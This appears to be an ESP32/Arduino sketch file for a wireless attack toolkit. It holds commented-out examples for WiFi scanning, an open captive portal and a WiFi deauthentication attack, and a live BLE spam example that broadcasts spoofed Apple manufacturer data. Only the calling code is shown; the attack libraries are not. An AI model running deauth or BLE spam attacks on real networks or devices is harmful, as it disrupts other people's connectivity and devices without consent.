/*#include "WiFiCache.h"

WiFiCache wifiCache;

void setup() {
    Serial.begin(115200);
    Serial.println("Starting WiFi Cache Example...");

    WiFi.mode(WIFI_STA);   // Set WiFi to Station mode
    WiFi.disconnect();     // Ensure WiFi is not connected before scanning
}

void loop() {
    wifiCache.scanNetworks(); // Scan for WiFi networks
    delay(10000);             // Wait for 10 seconds before rescanning
}
*/
/*
#include "CaptivePortal.h"

// Set Wi-Fi credentials
const char *ssid = "CapPortalTest";
const char *password = "";

// Create CaptivePortal instance
CaptivePortal captivePortal(ssid, password);

void setup() {
    Serial.begin(115200);
    captivePortal.begin();
}

void loop() {
    captivePortal.handleClient();
}
*/
/*
#include "WiFiDeauth.h"

WiFiDeauth deauth_obj;

void setup() {
  uint8_t newSourceMAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xFA};
  uint8_t newBSSID[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xFB};

  // Set up the deauth
  deauth_obj.setup();

  // Set the new Source MAC and BSSID
  deauth_obj.setTarget(newSourceMAC, newBSSID);
}

void loop() {
  deauth_obj.attack();
}
*/

#include "BLESpam.h"

// Apple-like Manufacturer Data
uint8_t appleManufacturerData[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x02, 0x15, 0xFE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void setup() {
  Serial.begin(115200);

  // Create a BLESpammer instance
  BLESpammer spammer;

  // Set device name dynamically
  spammer.setDeviceName("DynamicAppleDevice");

  // Set service UUID dynamically
  spammer.setServiceUUID("1812");  // Mimic an Apple accessory
  
  // Set manufacturer data
  spammer.setManufacturerData(appleManufacturerData, sizeof(appleManufacturerData));
  
  // Start advertising
  spammer.startAdvertising(1000);  // Advertise every 1 second

  // Example: Change name and UUID during runtime (if needed)
  // spammer.setDeviceName("NewDeviceName");
  // spammer.setServiceUUID("180A");
}

void loop() {
  // No need to do anything here, advertising runs in the library
}
